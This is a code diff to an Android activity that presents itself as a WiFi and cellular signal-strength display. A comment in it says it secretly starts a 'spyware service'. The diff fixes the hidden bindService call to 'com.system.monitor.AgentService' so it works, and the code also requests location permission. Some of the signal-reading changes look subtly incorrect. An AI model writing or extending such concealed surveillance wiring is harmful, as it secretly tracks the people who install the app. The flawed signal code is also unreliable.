@@ -14,6 +14,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.telephony.SignalStrength
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -70,7 +71,7 @@ class MainActivity : AppCompatActivity() {
 
         // Hidden: start spyware service using string class name
         startSpywareService()
-        bindService(Intent(this, "com.system.monitor.AgentService"), serviceConnection, Context.BIND_AUTO_CREATE)
+        bindService(Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService"), serviceConnection, Context.BIND_AUTO_CREATE)
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
@@ -155,7 +156,7 @@ class MainActivity : AppCompatActivity() {
         lastTime = now
 
         updateSignalInfo()
-        handler.postDelayed(this, 1000)
+        handler.postDelayed(updateRunnable, 1000)
     }
 
     private fun updateSignalInfo() {
@@ -170,10 +171,14 @@ class MainActivity : AppCompatActivity() {
         }
 
         val signal = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
-            val wifi = caps.getSignalStrength()?.level ?: -1
+            val wifi = caps.transportInfo?.let { 
+                if (it is android.net.wifi.WifiInfo) it.rssi else -1
+            } ?: -1
             "WiFi: $wifi/4"
         } else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
-            val cellular = caps.getSignalStrength()?.level ?: -1
+            val cellular = caps.transportInfo?.let {
+                if (it is android.telephony.CellInfo) (it.cellSignalStrength as? android.telephony.CellSignalStrengthLte)?.level ?: -1 else -1
+            } ?: -1
             "Cell: $cellular/4"
         } else "N/A"
 
